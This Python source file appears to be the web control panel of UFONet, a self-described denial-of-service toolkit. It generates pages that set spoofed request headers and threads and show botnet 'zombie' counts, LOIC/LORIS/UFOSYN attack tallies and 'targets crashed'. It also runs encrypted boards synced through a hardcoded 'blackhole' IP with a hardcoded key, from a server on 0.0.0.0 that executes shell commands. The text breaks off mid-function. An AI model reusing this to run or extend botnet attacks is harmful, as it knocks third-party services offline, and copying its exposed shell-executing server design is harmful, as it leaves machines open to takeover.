#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2013/2014/2015/2016/2017/2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import socket, threading, re, base64, os, time, random
import webbrowser, subprocess, urllib, urllib2, json, sys
from time import gmtime, strftime, strptime
from Crypto.Cipher import AES
from hashlib import sha1, sha256
from urlparse import urlparse
from base64 import b64decode
from decimal import Decimal
from options import UFONetOptions
from main import UFONet
from abductor import Abductor

host = "0.0.0.0"
port = 9999
default_blackhole = '176.28.23.46' # default blackhole
blackhole_sep = "|" # blackhole stream separator
board_msg_sep = "#!#" # board stream separator
grid_msg_sep = "#?#" # grid stream seperator
wargames_msg_sep = "#-#" # wargames stream seperator
crypto_key = "U-NATi0n!" # default encryption/decryption (+moderator board) key

class ClientThread(threading.Thread):
    def __init__(self, ip, port, socket):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.socket = socket
        self.pages = Pages()

    def run(self):
        req = self.socket.recv(2048)
        res = self.pages.get(req)
        if res is None:
            self.socket.close()
            return
        out = "HTTP/1.0 %s\r\n" % res["code"]
        out += "Content-Type: %s\r\n\r\n" % res["ctype"]
        out += "%s" % res["html"]
        self.socket.send(out)
        self.socket.close()
        if "run" in res and len(res["run"]):
            subprocess.Popen(res["run"], shell=True)

class Pages():
    def file_len(self, fn):
        with open(fn) as f:
            for i, l in enumerate(f):
                pass
        return i + 1

    def html_army_map(self,target=None):
        target_js="total_zombies = "+str( int(self.file_len(self.zombies_file))+int(self.file_len(self.aliens_file))+int(self.file_len(self.droids_file))+int(self.file_len(self.ucavs_file))+int(self.file_len(self.rpcs_file)) )+"\ninitMap()\n\n"
        if target is not None:
            target_js += "$('#ufomsg').load('/js/ajax.js?doll="+target+"')\n"
        return self.pages["/header"] + """
  <link rel="stylesheet" href="/js/style.css" />
  <link rel="stylesheet" href="/js/ajaxmap.css" />
  <link rel="stylesheet" href="/js/leaflet/leaflet.css" />
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.Default.css"/>
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.css"/>
  <script src="/js/leaflet/leaflet.js"></script>
  <script src="/js/cluster/leaflet.markercluster-src.js"></script>
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/rlayer-src.js"></script>
  <script src="/js/raphael.js"></script>
  <script src="/js/ufo.js"></script>
  <script src="/js/ajax.js"></script>
</head><body bgcolor="black" text="black">
  <div id="wrapper">
      <div id="map" style="width: 100%; height: 100%"></div>
  </div>
<script type="text/javascript">
window.onload = function(){
"""+target_js+"""
}
  </script>
<center>
""" + self.pages["/footer"]      

    def html_request_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>settings updated"""+self.pages["/footer"]

    def html_requests(self):
        # read requests configuration file (json)
        try:
            with open(self.mothership_webcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_webcfg_file) == True:
                print '\n[Error] - Cannot open: "core/json/webcfg.json"...\n'
                sys.exit(2)
            else: # generate default requests configuration file
                print '\n[Info] - Cannot found: "core/json/webcfg.json". Generating...\n'
                with open(self.mothership_webcfg_file, "w") as f:
                    json.dump({"rproxy": "NONE", "ruseragent": "RANDOM", "rreferer": "RANDOM", "rhost": "NONE", "rxforw": "on", "rxclient": "on", "rtimeout": "10", "rretries": "1", "rdelay": "0", "threads": "5", "rssl": "off"}, f, indent=4)
        # set values of requests configuration from json file to html form
        with open(self.mothership_webcfg_file) as data_file:
            data = json.load(data_file)
        self.agents = [] # generating available user-agents
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.user_agent = random.choice(self.agents).strip()
        self.rproxy = data["rproxy"]
        if self.rproxy == "NONE":
            self.rproxy = ""
        self.ruseragent = data["ruseragent"]
        if self.ruseragent == "RANDOM":
            self.ruseragent = self.user_agent # random user-agent
        self.rreferer = data["rreferer"]
        if self.rreferer == "RANDOM":
            self.rreferer = self.referer # random referer
        self.rhost = data["rhost"]
        if self.rhost == "NONE":
            self.rhost = ""
        self.rxforw = data["rxforw"]
        if self.rxforw == "on":
            self.rxforw_check = 'checked'
        else:
            self.rxforw_check = ''
        self.rxclient = data["rxclient"]
        if self.rxclient == "on":
            self.rxclient_check = 'checked'
        else:
            self.rxclient_check = ''
        self.rtimeout = data["rtimeout"]
        self.rretries = data["rretries"]
        self.rdelay = data["rdelay"]
        self.threads = data["threads"]
        self.rssl = data["rssl"]
        if self.rssl == "on":
            self.rssl_check = 'checked'
        else:
            self.rssl_check = ''
        return self.pages["/header"] + """
<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure requests:</u>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> Use proxy server:</td>
 <td> <input type="text" name="rproxy" value='"""+str(self.rproxy)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP User-Agent header:</td>
 <td> <input type="text" name="ruseragent" value='"""+str(self.ruseragent)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Referer header:</td>
 <td> <input type="text" name="rreferer" value='"""+str(self.rreferer)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Host header:</td>
 <td> <input type="text" name="rhost" value='"""+str(self.rhost)+"""'></td>
</tr>
<tr>
 <td> Set your HTTP X-Forwarded-For with random IP values:</td>
 <td> <input type="checkbox" name='rxforw' """+self.rxforw_check+"""></td>
</tr>
<tr>
 <td> Set your HTTP X-Client-IP with random IP values:</td>
 <td> <input type="checkbox" name='rxclient' """+self.rxclient_check+"""></td>
</tr>
<tr>
 <td> Select your timeout:</td>
 <td> <input type="text" name="rtimeout" value='"""+str(self.rtimeout)+"""'></td>
</tr>
<tr>
 <td> Retries when the connection timeouts:</td>
 <td> <input type="text" name="rretries" value='"""+str(self.rretries)+"""'></td>
</tr>
<tr>
 <td> Delay in seconds between each HTTP request:</td>
 <td> <input type="text" name="rdelay" value='"""+str(self.rdelay)+"""'></td>
</tr>
<tr>
 <td> Number of threads:</td>
 <td> <input type="text" name="threads" value='"""+str(self.threads)+"""'></td>
</tr>
<tr>
 <td> Force usage of SSL/HTTPS requests:</td>
 <td> <input type="checkbox" name='rssl' """+self.rssl_check+"""></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="Requests()"></pre>
</form>
""" + self.pages["/footer"]

    def html_board_profile_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Board profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_grid_profile_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Grid profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def profile_crew(self, icon):
        files = os.listdir("core/images/crew/")
        if icon == "NONE":
            icon = "link1"
        html_stream = ""
        html_stream += "<table cellspacing='2' cellpadding='5'><form method='GET'><tr>"
        for f in files:
            id = str(f.replace(".png", ""))
            value = str(f.replace(".png", ""))
            if icon == value:
                checked = " CHECKED"
            else:
                checked = ""
            html_stream += "<td><input type='radio' name='profile_icon' id='"+id+"' value='"+value+"'"+ checked+"><img src='images/crew/"+f+"'></td>"
        html_stream += "</tr></table>"
        return html_stream

    def html_board_profile(self):
        try:
            with open(self.mothership_boardcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_boardcfg_file) == True:
                print '[Error] - Cannot open: "core/json/boardcfg.json"...\n'
                sys.exit(2)
            else: 
                print '[Info] - Cannot found: "core/json/boardcfg.json". Generating...\n'
                with open(self.mothership_boardcfg_file, "w") as f:
                    json.dump({"profile_token": "NONE", "profile_icon": "NONE", "profile_nick": "Anonymous"}, f, indent=4)
                f.close()
                with open(self.mothership_boardcfg_file) as data_file:
                    data = json.load(data_file)
        self.profile_token = str(random.getrandbits(128)) # generating random token hash 
        self.profile_icon = data["profile_icon"]
        self.profile_nick = data["profile_nick"]
        self.profile_nick.encode('utf-8')
        return self.pages["/header"] + """
<script language="javascript"> 
function BoardProfile() {
        var win_board = window.open("board_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure profile:</u>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> <u>OPERATOR/LINK:</u></td>
 <td> """+self.profile_crew(self.profile_icon)+"""</td>
</tr>
<tr>
 <td> <u>NICKNAME:</u></td>
 <td> <input type="text" name="profile_nick" pattern=".{3,12}" required title="3 to 12 characters" value='"""+self.profile_nick.encode('utf-8')+"""'></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="BoardProfile()"></pre>
</form>
""" + self.pages["/footer"]

    def html_grid_profile(self):
        try:
            with open(self.mothership_gridcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_gridcfg_file) == True:
                print '[Error] - Cannot open: "core/json/gridcfg.json"...\n'
                sys.exit(2)
            else: 
                print '[Info] - Cannot found: "core/json/gridcfg.json". Generating...\n'
                with open(self.mothership_gridcfg_file, "w") as f:
                    json.dump({"grid_token": "NONE", "grid_contact": "UNKNOWN!", "grid_nick": "Anonymous"}, f, indent=4)
                f.close()                
                with open(self.mothership_gridcfg_file) as data_file:
                    data = json.load(data_file)
        self.grid_token = str(random.getrandbits(128)) # generating random token hash 
        self.grid_contact = data["grid_contact"]
        self.grid_contact.encode('utf-8')
        self.grid_nick = data["grid_nick"]
        self.grid_nick.encode('utf-8')
        return self.pages["/header"] + """
<script language="javascript"> 
function GridProfile() {
        var win_board = window.open("grid_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure grid profile:</u><br>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> <u>NICKNAME:</u></td>
 <td> <input type="text" name="grid_nick" pattern=".{3,12}" required title="3 to 12 characters" value='"""+self.grid_nick.encode('utf-8')+"""'></td>
</tr>
<tr>
 <td> <u>EMAIL/URL (CONTACT):</u></td>
 <td> <input type="text" name="grid_contact" pattern=".{8,120}" required title="8 to 120 characters" value='"""+self.grid_contact.encode('utf-8')+"""'></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="GridProfile()"></pre>
</form>
""" + self.pages["/footer"]

    def html_board_remove(self):
        try:
            with open(self.mothership_boardcfg_file, "w") as f:
                json.dump({"profile_token": "NONE", "profile_icon": "NONE", "profile_nick": "Anonymous"}, f, indent=4)
        except:
            return
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Board profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_grid_remove(self):
        try:
            with open(self.mothership_gridcfg_file, "w") as f:
                json.dump({"grid_token": "NONE", "grid_contact": "UNKNOWN!", "grid_nick": "Anonymous"}, f, indent=4)
        except:
            return
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Grid profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_stats(self):
        return self.pages["/header"] + """<script language="javascript"> 
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=no, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script></head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><img src="/images/mothership.png"></td>
<td>STATS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button></td>
</tr</table>
<br>

<table border="0" cellpadding="5" cellspacing="10"><tr><td>

<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>General:</u></b></td></tr>
<tr>
<td>Flying (times):</td><td align='right'><font color='red'>""" + str(self.aflying) + """</font></td></tr>
</table>

</td><td>

<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>Botnet:</u></b></td></tr>
<tr>
<td>Total Cargo (now):</td><td align='right'><a href='javascript:runCommandX("cmd_list_army")'>"""+ self.total_botnet +"""</a></td></tr>
<tr>
<td>Scanner (new bots via dorking):</td>
<td align='right'><font color='blue'>""" + str(self.ascanner) + """</font></td></tr>
<tr>
<td>Transferred (new bots via blackholes):</td>
<td align='right'><font color='green'>""" + str(self.atransferred) + """</font></td></tr>
<tr>
<td>Max. Chargo (always): </td><td align='right'><font color='orange'>""" + str(self.amax_chargo) + """</font></td></tr>
</table>

</td><td>

<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>Missions:</u></b></td></tr>
<tr>
<td>Created (launched):</td><td align='right'><font color='red'>""" + str(self.amissions) + """</font></td></tr>
<tr>
<td>Attacks (completed):</td><td align='right'><font color='blue'>""" + str(self.acompleted) + """</font></td></tr>
<tr>
<td>LOIC (used):</td><td align='right'><font color='cyan'>""" + str(self.aloic) + """</font></td></tr>
<tr>
<td>LORIS (used):</td><td align='right'><font color='cyan'>""" + str(self.aloris) + """</font></td></tr>
<tr>
<td>UFOSYN (used):</td><td align='right'><font color='cyan'>""" + str(self.aufosyn) + """</font></td></tr>
<tr>
<td>Targets (crashed):</td><td align='right'><font color='green'>""" + str(self.tcrashed) + """</font></td></tr>
<tr>
<td>Crashing (T*100/A=C%):</td><td align='right'><font color='orange'>""" + str(round(self.mothership_acc, 2)) + """%</font></td></tr>
</table>
</td></tr></table>
<br><hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

    def hmac_sha1(self, key, msg):
        if len(key) > 20:
            key = sha1(key).digest()
        key += chr(0) * (20 - len(key))
        o_key_pad = key.translate(self.trans_5C)
        i_key_pad = key.translate(self.trans_36)
        return sha1(o_key_pad + sha1(i_key_pad + msg).digest()).digest()

    def derive_keys(self, key):
        h = sha256()
        h.update(key)
        h.update('cipher')
        cipher_key = h.digest()
        h = sha256()
        h.update(key)
        h.update('mac')
        mac_key = h.digest()
        return (cipher_key, mac_key)

    def decrypt(self, key, text):
        KEY_SIZE = 32
        BLOCK_SIZE = 16
        MAC_SIZE = 20
        mode = AES.MODE_CFB
        try:
            iv_ciphertext_mac = b64decode(text)
        except TypeError:
            return None
        iv = iv_ciphertext_mac[:BLOCK_SIZE]
        ciphertext = iv_ciphertext_mac[BLOCK_SIZE:-MAC_SIZE]
        mac = iv_ciphertext_mac[-MAC_SIZE:]
        (cipher_key, mac_key) = self.derive_keys(key)
        expected_mac = self.hmac_sha1(mac_key, iv + ciphertext)
        if mac != expected_mac:
            return None
        aes = AES.new(cipher_key, mode, iv)
        self.decryptedtext = aes.decrypt(ciphertext)

    def encrypt(self, key, text):
        from server.crypter import Cipher
        from base64 import b64encode, b64decode
        key = b64encode(key)
        c = Cipher(key, text)
        msg = c.encrypt()
        c.set_text(msg)
        self.encryptedtext = str(msg)

    def html_news(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        news_key=document.getElementById("news_key").value
        if(news_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="news_key="+escape(news_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshNews(){
        news_source=document.getElementById("news_source").value
        if(news_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="news_source="+escape(news_source)
         runCommandX("cmd_refresh_news",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="news_source" id="news_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshNews()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search News...</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Psihiz says: """ + self.ranking + """... Welcome to the Crypto-News!...');"><img src="/images/aliens/alien1.png"></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="news_key" id="news_key" size="20" value='"""+str(self.crypto_key)+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.news_status_color + """'>"""+ self.news_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.news_text+"""</div><br><br>
""" + self.pages["/footer"]

    def html_missions(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        missions_key=document.getElementById("missions_key").value
        if(missions_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="missions_key="+escape(missions_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshMissions(){
        missions_source=document.getElementById("missions_source").value
        if(missions_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="missions_source="+escape(missions_source)
         runCommandX("cmd_refresh_missions",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="missions_source" id="missions_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshMissions()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search missions...</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Mnahät says: """ + self.ranking + """... Welcome to the Crypto-Missions!...');"><img src="/images/aliens/alien2.png"></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="missions_key" id="missions_key" size="20" value='"""+str(self.crypto_key)+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.missions_status_color + """'>"""+ self.missions_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.missions_text+"""</div><br><br>
""" + self.pages["/footer"]

    def html_board(self):
        self.board_welcome = "<div id='board_warning' style='display: none;'><pre><u>WARNING:</u> <br><br> 1) This is our 'Space Cantina': DON'T BE A LAMER!!! <br> 2) NO language RESTRICTIONS <br> 3) ABUSING == #HACKBACK (THIS IS NOT KIND OF FAME YOU WANT)<br> 4) CONTENT can be MODIFIED/REMOVED without notice<br> 5) LOVE, DONATIONS and REPORTS -> <a href='http://127.0.0.1:9999/help' target='_blank'>HERE</a></pre></div>" # board hardcoded warning (hehe)
        self.board_topic = "<select id='board_selector'><option value='general'>GENERAL</option><option value='opsec'> - OPSEC: #UFOSTORM</option><option value='faq'>UFONET/FAQ</option><option value='bugs'>UFONET/BUGS</option><option value='media'>UFONET/MEDIA</option></select>"
        self.board_send_msg = "<button title='Send your message to the Board (REMEMBER: you will cannot remove it!)...' onclick='SendMessage()'>SEND IT!</button>"
        if '"profile_token": "NONE"' in open(self.mothership_boardcfg_file).read():
            device_state = "OFF"
            device = "Board device: <font color='red'>OFF</font><br>"
        else:
            device_state = "ON"
            self.moderator_text = ''.join(random.sample(self.moderator_text,len(self.moderator_text)))
            boardcfg_json_file = open(self.mothership_boardcfg_file, "r") # extract mothership boardcfg
            data = json.load(boardcfg_json_file)
            boardcfg_json_file.close()
            profile_token = data["profile_token"]
            profile_icon = data["profile_icon"]
            profile_nick = data["profile_nick"]
            self.profile_nick.encode('utf-8')
            device = "<u>OPERATOR/LINK:</u> <font color='green'>ON</font><br><table cellpadding='5'><tr><td><img src='images/crew/"+str(profile_icon)+".png'></td></tr><tr><td> -NICKNAME: "+self.profile_nick.encode('utf-8')+"</td></tr><tr><td> -ID: "+str(profile_token)+"</td></tr></table>"
        if device_state == "OFF":
            board_filter = ""
        else:
            board_filter = "<table cellpadding='5' border='1'><tr><td><input type='radio' name='filter' id='filter_all' value='ALL' CHECKED>/ALL<br> </td><td><input type='radio' name='filter' id='filter_general' value='GENERAL'>/GENERAL</td><td><input type='radio' name='filter' id='filter_opsec' value='OPSEC'>/#OPSEC<br> </td><td><input type='radio' name='filter' id='filter_faq' value='FAQ'>/FAQ</td><td><input type='radio' name='filter' id='filter_bugs' value='BUGS'>/BUGS</td><td><input type='radio' name='filter' id='filter_media' value='MEDIA'>/MEDIA</td></tr></table>"
        if device_state == "OFF":
            sync_panel = ""
        else:
            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source' id='board_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for records on that blackhole...' onclick='SyncBoard()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><br><hr>"
        if device_state == "OFF":
            board_panel = ""
        else:
            with open(self.board_file) as f:
                for line in f:
                    line = line.strip()
                    self.board_warning += "\n" + " " + line + " " + "\n"
            f.close()
            self.moderator_text = re.sub("(.{100})", "\\1\n", self.moderator_text, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
            l = time.ctime(os.path.getmtime(self.board_file)) # get last modified time
            board_panel = "<form method='GET'><table cellpadding='5'><tr><td><table cellpadding='10' border='1'><tr><td><table cellpadding='10' border='1'><tr><td> <input type='radio' name='board_action' id='read' onclick='javascript:OptionsCheck();' CHECKED> READ<br> </td><td> <input type='radio' name='board_action' id='write' onclick='javascript:OptionsCheck();'> WRITE<br></td></tr></table></td><td> KEY: <input type='text' name='board_key' id='board_key' size='20' value='"+str(self.crypto_key)+"'> </td></tr></table></td><td><div style='display:block' id='board_read'><table cellpadding='5'><tr><td>"+board_filter+"</td></tr><tr><td><a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt_board();>Try decryption!</a></td></tr></table></div></td></tr><tr><td>"+self.board_welcome+"</td><td><div style='display:none' id='board_send'><table cellpadding='10' border='1'><tr><td><table cellpadding='10' border='1'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source_send' id='board_source_send' size='20' value='"+default_blackhole+"'></td></tr><tr><td>TOPIC:</td><td>"+self.board_topic+"</td></tr><tr><td>MESSAGE:</td><td><textarea rows='3' cols='50' name='stream_txt' id='stream_txt' maxlength='140' placeholder='Enter your message (1-140 chars)...'></textarea></td></tr><tr><td>"+self.board_send_msg+"</td></tr></table></td></tr></table></div></td></tr></table></form><br><hr><br><div id='sync_panel_block' name='sync_panel_block' style='display:none;'>"+sync_panel+"<br></div><u>CRYPTO-BOARD</u>: (Last Update: <font color='green'>"+str(l)+"</font>)<br><br><div id='cmdOut'></div><div id='nb1' style='display: block;'>"+self.moderator_text+"</div><br><br>"
        if device_state == "OFF":
            remove_profile = ""
        else:
            remove_profile = '| <button title="Syncronize data from a blackhole/board with your device..." onclick="Sync_panel()">DOWNLOAD!</button> | <button title="Remove your profile and turn OFF this device..." onclick="RemoveProfile()">TURN OFF!</button>'
        return self.pages["/header"] + """<script language="javascript"> 
function BoardProfile() {
        var win_board_profile = window.open("board_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function RemoveProfile() {
        var win_board_profile = window.open("board_remove","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Decrypt_board(){
        board_key=document.getElementById("board_key").value
        if (document.getElementById('filter_all').checked) {
          filter = document.getElementById('filter_all').value;
        }
        if (document.getElementById('filter_general').checked) {
          filter = document.getElementById('filter_general').value;
        }
        if (document.getElementById('filter_opsec').checked) {
          filter = document.getElementById('filter_opsec').value;
        }
        if (document.getElementById('filter_faq').checked) {
          filter = document.getElementById('filter_faq').value;
        }
        if (document.getElementById('filter_bugs').checked) {
          filter = document.getElementById('filter_bugs').value;
        }
        if (document.getElementById('filter_media').checked) {
          filter = document.getElementById('filter_media').value;
        }
        if(board_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="board_key="+escape(board_key)+"&filter="+escape(filter)
         runCommandX("cmd_decrypt_moderator_board",params)
         document.getElementById("nb1").style.display = "none";
         }
       }
function OptionsCheck() {
    if (document.getElementById('read').checked) {
        document.getElementById('board_read').style.display = 'block';
        document.getElementById('board_send').style.display = 'none';
        document.getElementById('board_warning').style.display = 'none';
    } 
    else if(document.getElementById('write').checked) {
        document.getElementById('board_send').style.display = 'block';
        document.getElementById('board_warning').style.display = 'block';
        document.getElementById('board_read').style.display = 'none';
   }
}
function Sync_panel(){
         document.getElementById("sync_panel_block").style.display = "block";
       }
function SyncBoard(){
        document.getElementById('nb1').style.display = 'none';
        board_source=document.getElementById("board_source").value
        if(board_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="board_source="+escape(board_source)
         runCommandX("cmd_sync_board",params)
         setTimeout("location.reload()", 10000)
         }
      }
</script>
<script language="javascript">
function SendMessage() {
        board_source=document.getElementById("board_source_send").value
        board_key=document.getElementById("board_key").value
        stream_txt=document.getElementById("stream_txt").value
        board_selector=document.getElementById("board_selector");
        board_topic = board_selector.options[board_selector.selectedIndex].value;
        if(board_key == "") {
            board_key='"""+str(self.crypto_key)+"""';
        }else{
          if(stream_txt == "") {
            window.alert("You need to enter a message! (~ 1-140 characters)");
            return
          }else{
           if(board_source == "") {
            window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
           return
          }else{
            params="board_source="+escape(board_source)+"&board_key="+escape(board_key)+"&board_topic="+escape(board_topic)+"&stream_txt="+escape(stream_txt)
            runCommandX("cmd_send_message_board",params)
            setTimeout("location.reload()", 10000)
           }
          }
        }
       }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Riättth says: """ + self.ranking + """... Welcome to the Board. You can generate new identities every time that you want. But remember that, this can be a dangerous place. Just respect to others to be respected... Keep safe and enjoy it. COPYCAT!.');"><img src="/images/board.png"></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>"""+device+"""<br><button title="Set your profile for this device..." onclick="BoardProfile()">CONFIGURE!</button> """+remove_profile+"""
</td></tr></table></tr></table>
<hr><br>"""+board_panel+"""
""" + self.pages["/footer"]

    def generate_grid(self):
        with open(self.grid_file) as f:
            for line in f:
                line = line.strip()
            f.close()
            mothership_members = 0 # mothership_members stats bonus
            grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><u>NICKNAME:</u></td><td align='center'><u>RANKING:</u></td><td align='center'><u>CHARGO:</u></td><td align='center'><u>DORKING:</u></td><td align='center'><u>TRANSF:</u></td><td align='center'><u>MAX.CHARGO:</u></td><td align='center'><u>MISSIONS:</u></td><td align='center'><u>ATTACKS:</u></td><td align='center'><u>LOIC:</u></td><td align='center'><u>LORIS:</u></td><td align='center'><u>UFOSYN:</u></td><td align='center'><u>CONTACT:</u></td></tr>"
